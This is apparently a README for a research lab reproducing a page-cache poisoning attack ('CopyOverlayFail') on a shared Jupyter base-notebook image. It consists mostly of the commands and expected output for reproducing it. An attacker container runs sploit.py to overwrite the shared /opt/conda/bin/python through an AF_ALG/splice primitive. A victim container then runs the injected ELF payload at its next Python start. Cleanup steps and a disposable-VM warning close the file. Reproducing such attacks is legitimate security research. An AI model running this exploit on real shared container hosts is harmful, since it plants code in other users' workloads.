# Notebook Runtime Lab

Minimal Jupyter-image variant of CopyOverlayFail.

Both containers use the same `quay.io/jupyter/base-notebook` image. The attacker poisons the shared Conda Python executable. The victim later starts Python, simulating a new notebook kernel launch, and runs the supplied ELF payload.

This is not a new vulnerability and not host escape. It reuses the original CopyFail primitive against a shared notebook image-layer file.

## Run

From the parent directory, build the example payload:

```bash
cd /home/bee/research/copyfail/CopyOverlayFail
python3 make_pwnd_payload.py
```

Start the notebook lab:

```bash
cd /home/bee/research/copyfail/CopyOverlayFail/notebook-lab
docker compose up -d
```

Baseline victim Python:

```bash
docker compose exec victim /opt/conda/bin/python -c 'print("kernel-ok")'
```

Poison the shared Python executable from the attacker:

```bash
docker compose exec attacker /opt/conda/bin/python /lab/sploit.py /opt/conda/bin/python /lab/payload.elf
```

Trigger the victim:

```bash
docker compose exec victim /opt/conda/bin/python -c 'print("kernel-ok")'
```

Expected:

```text
kernel-ok
[+] target: /opt/conda/bin/python
[+] payload file: /lab/payload.elf
[+] payload length: 160 bytes
[+] wrote 160 bytes through AF_ALG/splice page-cache primitive
PWND
```

The last command represents a future notebook kernel start. Already-running Python kernels are not affected; the trigger is the next `execve()` of the poisoned Python inode.

## Cleanup

```bash
docker compose down --remove-orphans
sudo sync
sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches'
```

Use a disposable VM. This can poison cached executable pages for the local Jupyter image.
